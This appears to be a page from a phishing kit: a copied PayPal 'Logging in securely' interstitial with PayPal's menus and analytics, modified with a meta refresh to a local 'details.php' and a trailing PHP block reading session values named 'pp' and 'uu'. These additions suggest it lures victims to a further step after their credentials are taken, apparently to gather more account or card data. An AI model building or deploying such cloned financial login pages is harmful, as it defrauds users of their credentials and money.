<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en"><head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	  <meta http-equiv="refresh" content="4;URL=details.php">
   
<!--
         Script info: script: webscr, cmd: _login-processing, template: p/gen/login-processing, date: Jul 21, 2011 06:37:18 PDT; country: US, language: en_US, xslt server: 
		web version: 78.0-2020243 branch: BWR_780_int
		DXPT: true
			TEMPLATE: Customer/general/LoginProcessing.xsl
			LOCALE: en_US, COUNTRY: US
			PRODUCTNUMBER: 78.0, BUILDNUMBER: 2020243, BRANCHNAME: BWR_780_int, PRODUCTNUMBEROVERRIDE: 
			RESOLVERID: *:webscr:2020243
		content version: -
		pexml version: 78.0-2021217
		page XSL: Customer/US/en_US/general/LoginProcessing.xsl
       hostname : 4s.JkQ9PVTfId8PQstTGjk6Y1O7wodI9UP6updGSoF4
         rlogid : 4s%2fJkQ9PVTfId8PQstTGjsuDhNx2lMmFE5pqM4irf2GPVVxXaP6rug%3d%3d_1316a7cafa0
-->
<title>Logging in - PayPal</title>
<!--googleoff: all-->
<meta name="description" content="PayPal is the safer, easier way to pay online without revealing your credit card number.">
<!--googleon: all-->
<meta http-equiv="X-UA-Compatible" content="IE=8"><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20110722-1/css/core/global.css"><link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20110722-1/css/Customer/pages/pageSalsa.css">
<!--[if IE 8]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20110722-1/css/browsers/ie8.css"><![endif]-->

<!--[if IE 7]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20110722-1/css/browsers/ie7.css"><![endif]-->

<!--[if lte IE 6]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20110722-1/css/browsers/ie6.css"><![endif]-->

<link media="print" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20110722-1/css/core/print.css"><style type="text/css">
					h3 {margin:4em 0 0 0; line-height:normal;}
					p.note {color:#656565; font-size:0.9em;}
					p.note a {color:#656565;}
					p strong {margin-top:2em; color:#1A3665; font-size:1.25em;}
					img.actionImage {margin: 1.88em 0 2em 0;}
				</style><style type="text/css" id="antiClickjack">body{display:none !important;}</style><script type="text/javascript">
				if (self === top) {
					var antiClickjack = document.getElementById("antiClickjack");
					antiClickjack.parentNode.removeChild(antiClickjack);
				} else {
					top.location = self.location;
				}
			</script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20110722-1/js/lib/min/global.js"></script><script type="text/javascript">PAYPAL.util.lazyLoadRoot = 'https://www.paypalobjects.com/WEBSCR-640-20110722-1';</script><link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"><link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png"></head><body><noscript><style type="text/css">body{display:block !important;}</style><p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript><img src="https://b.stats.paypal.com/counter.cgi?r=KOORCrt2HI4riX9uJLotdRqgq1TgFuqcBd7_gld_rJWQajedaj4IfxCgAKyoymTmxfNZU9-mY-0Tqtlv3dclkv7xdAC6t9KHdYi0TO29wU-pw3qELcwbWqgWDa6Ed5YG8VMo_of6vU6vcPJFEbe_-3AKTYtjKP-2ru96Y7wyxV7xbUwesekJFCjy5QGQTusTa4APAWPC9__2nPzGKzqS_3pK3RxyKQyjNXQBdFZuiVGSUiBBwdTVfLJc2M0" border="0" class="accessAid" alt=""><div class="" id="page"><div id="header" class="notab"><h1><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_account"><img border="0" src="https://www.paypal.com/en_US/i/logo/paypal_logo.gif" alt="PayPal"></a></h1><div id="navPrimary" class="empty"></div></div><div id="content"><div id="headline"><h2 class="accessAid">Logging in</h2>
</div><div id="messageBox"></div><div id="main"><div class="layout1 textcenter"><h3>Logging you in securely...</h3><img src="https://www.paypalobjects.com/en_US/i/icon/icon_load_roundcorner_lock1_186x42_withlock.gif" border="0" class="actionImage" alt="Logging you in securely"><p><strong>PayPal. The world's most-loved way to pay and get paid.</strong></p><p class="note">If this page appears for more than 5 seconds, <a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-done&amp;login_access=1311751580">click here</a> to reload.</p></div></div></div><div role="navigation" id="navFull"><ul><li class="active"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&amp;nav=0" class="scTrack:SRD:Nav:RO">My Account</a><ul><li class="active"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&amp;nav=0.0" class="scTrack:SRD:Nav:RP">Overview</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_add-funds&amp;nav=0.1" class="scTrack:SRD:Nav:RQ">Add Funds</a><ul><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_add-funds-bank&amp;origination=_add-funds-bank&amp;ach_country_code=US&amp;nav=0.1.0" class="scTrack:SRD:Nav:FA">Add Funds from Bank Account</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_balance-manager&amp;nav=0.1.1" class="scTrack:SRD:Nav:k90">Balance Manager</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_addfunds-greendot&amp;user_action=add_funds_link&amp;nav=0.1.2" class="scTrack:SRD:Nav:V06">Add Funds from MoneyPak</a></li></ul></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_withdraw-funds&amp;nav=0.2" class="scTrack:SRD:Nav:RR">Withdraw</a><ul><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_withdraw-funds-bank&amp;nav=0.2.0" class="scTrack:SRD:Nav:RS">Transfer to Bank Account</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_withdraw-funds-check&amp;nav=0.2.1" class="scTrack:SRD:Nav:RT">Request a Check</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_dc-intro&amp;nav=0.2.2" class="scTrack:SRD:Nav:RU">PayPal Debit MasterCard</a></li></ul></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_history&amp;nav=0.3" class="scTrack:SRD:Nav:RV">History</a><ul><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_history&amp;nav=0.3.0" class="scTrack:SRD:Nav:RW">Basic Search</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_history-download&amp;nav=0.3.1" class="scTrack:SRD:Nav:RY">Download History</a></li></ul></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_statement&amp;nav=0.4" class="scTrack:SRD:Nav:BS96">Statements</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_complaint-view&amp;nav=0.5" class="scTrack:SRD:Nav:SC">Resolution Center</a><ul><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_complaint-view&amp;nav=0.5.0" class="scTrack:SRD:Nav:SD">View Open Cases</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/CaseManagement/customerservice/EducationModuleIndex&amp;nav=0.5.1" class="scTrack:SRD:Nav:SF">Tutorials</a></li></ul></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-summary&amp;nav=0.6" class="scTrack:SRD:Nav:SN">Profile</a><ul><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-email&amp;nav=0.6.0" class="scTrack:SRD:Nav:SO">Add or Edit Email</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-ach&amp;nav=0.6.1" class="scTrack:SRD:Nav:Z9">Add or Edit Bank Account</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&amp;flag_from_account_summary=1&amp;nav=0.6.2" class="scTrack:SRD:Nav:SP">Add or Edit Credit Card</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&amp;nav=0.6.3" class="scTrack:SRD:Nav:SQ">Add or Edit Street Address</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-phone&amp;nav=0.6.4" class="scTrack:SRD:Nav:SR">Add or Edit Phone Number</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-summary&amp;nav=0.6.5" class="scTrack:SRD:Nav:x76">More Options</a></li></ul></li></ul></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money&amp;nav=1" class="scTrack:SRD:Nav:TZ">Send Money</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_rm&amp;nav=2" class="scTrack:SRD:Nav:UC">Request Money</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_merchant&amp;nav=3" class="scTrack:SRD:Nav:UF">Merchant Services</a></li><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Marketing_CommandDriven/general/ProductsandServices&amp;nav=4" class="scTrack:SRD:Nav:AK6">Products &amp; Services</a></li></ul></div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20110722-1/js/lib/min/widgets.js"></script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20110722-1/js/lib/min/calendar.js"></script>

<!-- SiteCatalyst Code
Copyright 1997-2005 Omniture, Inc.
More info available at http://www.omniture.com -->
<script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20110722-1/js/site_catalyst/pp_jscode_080706.js"></script>
<script type="text/javascript">
s.prop1="p/gen/login-processing";
s.prop6="2TS43844NS170860A";
s.prop7="personal";
s.prop8="unverified";
s.prop9="unrestricted";
s.prop10="US";
s.prop11="";
s.prop20="1311751581";
s.prop35="in";
s.prop40="a3a8c8e96ad0";
s.prop50="en_US";
s.eVar5="US";
s.eVar7="personal:unverified:unrestricted";
s.eVar19="personal";
s.eVar31="p/gen/login-processing::_login-processing";
s.eVar50="4s%2fJkQ9PVTfId8PQstTGjsuDhNx2lMmFE5pqM4irf2GPVVxXaP6rug%3d%3d_1316a7cafa0";
s.pageName="p/gen/login-processing::_login-processing";
s.prop56="no";
s.prop18="";
s.prop16="";
s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
</script>
<script type="text/javascript"><!--
/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
function scOnload(){var s_code=s.t();if(s_code)document.write(s_code);}
if(window.addEventListener){
window.addEventListener('load',scOnload,false);
}else if(window.attachEvent){
window.attachEvent('onload', scOnload);
};
if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
//-->
</script><noscript><img
src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
height="1" width="1" border="0" alt="" /></noscript>
<!--/DO NOT REMOVE/-->

<!-- End SiteCatalyst Code -->
</body></html>
<?php



$_SESSION['pp'];

$_SESSION['uu'];


?>
